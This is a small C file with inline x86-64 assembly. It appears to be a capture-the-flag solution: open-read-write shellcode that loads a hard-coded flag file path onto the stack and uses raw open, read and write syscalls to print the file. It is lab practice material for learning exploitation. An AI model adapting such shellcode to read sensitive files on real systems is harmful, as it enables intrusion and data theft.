// ex.c
// gcc -o ex ex.c

__asm__(
    ".intel_syntax noprefix\n"
    ".global run_sh\n"
    "run_sh:\n"

    "push 0x0\n"                         // NULL byte
    "mov rax, 0x676e6f6f6f6f6f6f\n"       // \"oooooong\"
    "push rax\n"
    "mov rax, 0x6c5f73695f656d61\n"       // \"ame_is_l\"
    "push rax\n"
    "mov rax, 0x6e5f67616c662f63\n"       // \"c/flag_n\"
    "push rax\n"
    "mov rax, 0x697361625f6c6c65\n"       // \"ell_basi\"
    "push rax\n"
    "mov rax, 0x68732f656d6f682f\n"       // \"/home/sh\"
    "push rax\n"

    "mov rdi, rsp\n"     // filename
    "xor rsi, rsi\n"     // O_RDONLY
    "xor rdx, rdx\n"
    "mov rax, 2\n"       // sys_open
    "syscall\n"

    "mov rdi, rax\n"     // fd
    "mov rsi, rsp\n"
    "sub rsi, 0x30\n"    // buf
    "mov rdx, 0x30\n"
    "xor rax, rax\n"     // sys_read
    "syscall\n"

    "mov rdx, rax\n"     // count
    "mov rdi, 1\n"       // stdout
    "mov rax, 1\n"       // sys_write
    "syscall\n"
    
    "xor rdi, rdi\n"      // status 0
    "mov rax, 60\n"       // sys_exit
    "syscall\n"

);

void run_sh();

int main() {
    run_sh();
}
